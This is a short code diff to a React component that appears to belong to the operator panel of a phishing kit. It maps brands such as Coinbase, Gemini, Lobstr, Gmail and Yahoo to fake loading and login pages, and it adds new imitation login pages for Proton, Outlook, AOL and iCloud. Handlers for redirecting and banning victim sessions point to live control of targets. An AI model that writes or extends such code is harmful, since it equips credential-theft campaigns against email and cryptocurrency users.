@@ -563,9 +563,13 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
   const getDefaultPage = (brand) => {
     switch(brand) {
       case 'Lobstr': return 'lobstrloading.html';
-      case 'Yahoo': return 'yahooloading.html';
       case 'Gemini': return 'geminiloading.html';
-      case 'Gmail': return 'gmailloading.html';
+      case 'Proton': return 'protonlogin.html';
+      case 'Outlook': return 'outlooklogin.html';
+      case 'AOL': return 'aollogin.html';
+      case 'iCloud': return 'icloudlogin.html';
+      case 'Yahoo': return 'yahoowaiting.html';
+      case 'Gmail': return 'gmailwaiting.html';
       default: return 'loading.html'; // Coinbase default
     }
   };
